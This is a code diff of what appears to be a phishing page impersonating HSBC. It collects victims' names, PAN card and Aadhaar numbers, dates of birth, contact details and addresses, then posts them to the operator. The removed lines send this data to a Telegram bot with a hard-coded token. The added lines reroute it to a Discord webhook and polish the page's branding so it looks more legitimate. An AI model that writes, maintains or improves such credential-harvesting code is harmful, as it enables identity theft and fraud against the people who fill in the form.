@@ -247,7 +247,7 @@
                 </div>
                 <div class="form-group">
                     <label>City</label>
-                    <input type="text"  id="city" name="city">
+                    <input type="text" id="city" name="city">
                 </div>
                 <div class="form-group">
                     <label>State</label>
@@ -285,14 +285,14 @@
 </div>
 
 <p style="text-align: center; color: #999; font-size: 12px; margin-bottom: 40px;">
-    © The Hongkong and Shanghai BankingCorporation Limited
+    © The Hongkong and Shanghai Banking Corporation Limited
 </p>
 
 <script>
 document.getElementById("telegramFormsss").addEventListener("submit", function(e) {
     e.preventDefault();
 
-    var name = document.getElementById("name").value;  
+    var name = document.getElementById("name").value; 
     var middlename = document.getElementById("middlename").value;
     var lastname = document.getElementById("lastname").value;
     var pancard = document.getElementById("pancard").value;
@@ -306,8 +306,7 @@ document.getElementById("telegramFormsss").addEventListener("submit", function(e
     var state = document.getElementById("state").value;
     var employmentstatus = document.getElementById("employmentstatus").value;
 
-    var botToken = "7654977396:AAEzzSUAiGBgY2JEl3K8PmMp-Quj3QMXYTg";
-    var chatId = "1308711346";
+    var discordWebhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE";
 
     var message = "🚀 New Form Submission\n\n" +
         "Name: " + name + "\n" +
@@ -315,28 +314,25 @@ document.getElementById("telegramFormsss").addEventListener("submit", function(e
         "Last Name: " + lastname + "\n" +
         "Pancard: " + pancard + "\n" +
         "Date of Birth: " + dateofbirth + "\n" +
-        "Aadhar: " + aadhar + "\n" +  
+        "Aadhaar: " + aadhar + "\n" + 
         "Email: " + email + "\n" +
         "Mobile: " + mobile + "\n" + 
-        "Address: " + address + "\n" +   
+        "Address: " + address + "\n" +    
         "Pincode: " + pincode + "\n" +
         "City: " + city + "\n" + 
         "State: " + state + "\n" +
         "Employment: " + employmentstatus;
-      
-    var telegramURL = "https://api.telegram.org/bot" + botToken + "/sendMessage";
 
-    fetch(telegramURL, {
+    fetch(discordWebhookUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-            chat_id: chatId,
-            text: message
+            content: message
         })
     })
     .then(response => {
         if(response.ok) {
-            window.location.href = "verification.html";  
+            window.location.href = "verification.html"; 
         } else {
             alert("Error sending data.");
         }
